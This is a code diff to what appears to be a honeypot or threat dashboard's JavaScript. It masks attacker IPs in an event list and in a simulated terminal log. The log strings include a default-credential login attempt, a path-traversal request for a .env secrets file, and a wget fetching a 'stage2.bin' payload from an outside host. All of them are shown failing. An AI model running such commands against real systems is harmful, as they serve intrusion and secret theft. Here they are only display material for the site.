@@ -175,7 +175,7 @@ window.Site.ready(function () {
           return el("div", { className: "ev" },
             el("span", { className: "chip", style: "border:1px solid " + SEV[ev.sev] + "55;color:" + SEV[ev.sev] + ";text-align:center;" }, ev.sev),
             el("div", { style: "min-width:0;" },
-              el("span", { className: "mono", style: "font-size:13px;color:#fff;" }, ev.ip),
+              el("span", { className: "mono", style: "font-size:13px;color:#fff;" }, S.maskIp(ev.ip)),
               el("div", { style: "margin-top:4px;font-size:13px;color:rgba(255,255,255,.55);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;" }, S.mitreLink(ev.id), " · " + ev.tech)),
             el("div", { style: "text-align:right;min-width:86px;" },
               el("span", { className: "mono", style: "font-size:14px;color:rgba(255,255,255,.85);" }, fmt(ev.n) + "×"),
@@ -198,7 +198,7 @@ window.Site.ready(function () {
     "  [445] login: admin  pass: admin  FAILED",
     "$ curl -s /cgi-bin/.%2e/.env",
     "  200 OK  ·  0 bytes returned",
-    "$ wget http://45.9.148.12/stage2.bin",
+    "$ wget http://45.9.148.xxx/stage2.bin",
     "  connecting … 404 NOT FOUND",
     "  ERROR 404: nothing here. session logged."
   ];
